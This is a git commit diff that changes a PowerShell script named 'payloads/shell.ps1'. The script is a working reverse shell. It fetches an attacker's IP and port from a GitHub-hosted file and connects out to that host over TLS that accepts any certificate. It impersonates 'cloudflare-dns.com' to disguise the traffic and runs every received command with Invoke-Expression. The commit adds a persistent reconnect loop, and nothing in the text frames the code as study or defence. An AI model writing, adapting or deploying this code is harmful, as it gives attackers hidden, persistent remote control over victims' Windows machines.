42d46486a29b101f9417d49f9c313d04207d25c6
soumyo001 <www.soumyo@gmail.com>
2025-08-12 00:48:38 +0600

    mods

--- payloads/shell.ps1
+++ payloads/shell.ps1
@@ -8,45 +8,57 @@ $j = Invoke-RestMethod -Uri "https://github.com/Soumyo001/progressive_0verload/r
 $remoteIP = $j.IP
 $remotePort = $j.PORT
 
-do {
-    Start-Sleep -Seconds 1
-    try{
-        $TCPConnection = New-Object System.Net.Sockets.TcpClient($remoteIP, $remotePort)
-    }catch{}
-} until ($TCPConnection.Connected)
+while ($true) {
+    do {
+        Start-Sleep -Seconds 1
+        try{
+            $TCPConnection = New-Object System.Net.Sockets.TcpClient($remoteIP, $remotePort)
+        }catch{}
+    } until ($TCPConnection.Connected)
+
+    try {
+        $NetworkStream = $TCPConnection.GetStream()
+        $sslStream = New-Object System.Net.Security.SslStream($NetworkStream, $false, ({$true} -as [System.Net.Security.RemoteCertificateValidationCallback]))
+        $sslStream.AuthenticateAsClient("cloudflare-dns.com", $null, $false)
+        
+        if (!$sslStream.IsAuthenticated -or !$sslStream.IsSigned) {
+            $sslStream.Close()
+            $TCPConnection.Close()
+            continue
+        }
 
 
-$NetworkStream = $TCPConnection.GetStream()
-$sslStream = New-Object System.Net.Security.SslStream($NetworkStream, $false, ({$true} -as [System.Net.Security.RemoteCertificateValidationCallback]))
-$sslStream.AuthenticateAsClient("cloudflare-dns.com", $null, $false)
+        $streamWriter = New-Object System.IO.StreamWriter($sslStream)
 
-if (!$sslStream.IsAuthenticated -or !$sslStream.IsSigned) {
-    $sslStream.Close()
-    exit
-}
+        function writeStreamToServer($string){
+            [byte[]]$script:buffer = 0..$TCPConnection.ReceiveBufferSize | % {0}
+            $streamWriter.Write($string + 'SHELL '+(Get-Location).Path +' :>')
+            $streamWriter.Flush()
+        }
 
+        writeStreamToServer ''
 
-$streamWriter = New-Object System.IO.StreamWriter($sslStream)
-
-function writeStreamToServer($string){
-    [byte[]]$script:buffer = 0..$TCPConnection.ReceiveBufferSize | % {0}
-    $streamWriter.Write($string + 'SHELL '+(Get-Location).Path +' :>')
-    $streamWriter.Flush()
-}
-
-writeStreamToServer ''
-
-while (($bytesRead = $sslStream.Read($script:buffer, 0, $script:buffer.Length)) -gt 0) {
-
-    $command = [System.Text.Encoding]::UTF8.GetString($script:buffer, 0, $bytesRead - 1)
-
-    $command_output = try {
-        Invoke-Expression $command 2>&1 | Out-String
+        while (($bytesRead = $sslStream.Read($script:buffer, 0, $script:buffer.Length)) -gt 0) {
+        
+            $command = [System.Text.Encoding]::UTF8.GetString($script:buffer, 0, $bytesRead - 1)
+        
+            $command_output = try {
+                Invoke-Expression $command 2>&1 | Out-String
+            }
+            catch {
+                $_ | Out-String
+            }
+            writeStreamToServer($command_output)
+        }
+        $streamWriter.Close()
+        $sslStream.Close()
+        $TCPConnection.Close()
     }
     catch {
-        $_ | Out-String
+        if ($streamWriter) { $streamWriter.Close() }
+        if ($sslStream) { $sslStream.Close() }
+        if ($TCPConnection) { $TCPConnection.Close() }
     }
-    writeStreamToServer($command_output)
-}
 
-$streamWriter.Close()
+    Start-Sleep -Seconds 10
+}
